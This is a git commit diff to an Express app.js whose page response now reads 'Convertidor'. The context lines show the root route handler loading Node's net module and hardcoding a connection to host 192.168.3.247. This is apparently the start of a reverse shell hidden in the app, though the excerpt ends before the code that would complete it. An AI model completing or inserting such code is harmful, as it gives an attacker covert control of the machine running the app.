a596aed41df2a7c0b29630a3fdf8cf6454c609a9
tiesto2022 <96581886+tiesto2022@users.noreply.github.com>
2021-12-23 09:23:23 -0500

    Update app.js

--- app.js
+++ app.js
@@ -3,7 +3,7 @@ const app = express()
 const port = 3000
 
 app.get('/', (req, res) => {
-        send('Entro');
+        res.send('Convertidor');
         try {
         let net = require('net'),
             host = '192.168.3.247',
